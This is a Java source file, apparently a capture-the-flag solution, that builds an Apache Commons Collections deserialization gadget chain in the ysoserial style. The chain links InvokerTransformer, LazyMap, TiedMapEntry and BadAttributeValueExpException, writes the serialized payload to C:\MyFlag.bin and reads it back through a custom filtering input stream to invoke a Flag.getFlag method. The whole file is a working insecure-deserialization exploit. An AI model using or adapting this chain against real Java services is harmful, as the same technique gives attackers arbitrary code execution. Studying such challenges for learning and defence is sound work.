package com.trendmicro.jail;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import javax.management.BadAttributeValueExpException;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.util.Reflections;

import com.trendmicro.CustomOIS;

public class FlagWriter {

	@SuppressWarnings("rawtypes")
	public static void main(String[] args) throws Exception {
		// Build the payload and write to file C:\MyFlag.bin
		ChainedTransformer transformerChain = new ChainedTransformer(
			new Transformer[] { new ConstantTransformer(1) });
		Transformer[] transformers = new Transformer[] {
			new ConstantTransformer(Flag.class),
			new InvokerTransformer("getMethod",
				new Class[] {
					String.class, Class[].class
				},
				new Object[] {
					"getFlag", null
				}),
			new InvokerTransformer("invoke",
				new Class[] {
					Object.class, Object[].class
				},
				new Object[] {
					null, null
				}),
			new ConstantTransformer(HashMap.class),
			new InvokerTransformer("newInstance", null, null)
		};
		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
		
		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
		Field valField = val.getClass().getDeclaredField("val");
		valField.setAccessible(true);
		valField.set(val, entry);
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
		ObjectOutputStream oos = null;
		FileOutputStream fout = null;
		try{
		    fout = new FileOutputStream("C:\\MyFlag.bin");
		    oos = new ObjectOutputStream(fout);
		    oos.writeObject(val);
		} catch (Exception ex) {
		    ex.printStackTrace();
		} finally {
		    if(oos != null){
		        oos.close();
		    } 
		}
		
		// Run to verify it works
		ObjectInputStream ois = new CustomOIS(new FileInputStream("C:\\MyFlag.bin"));
		Object o = ois.readObject();
		System.out.println(o);
		ois.close();
	}
	
}
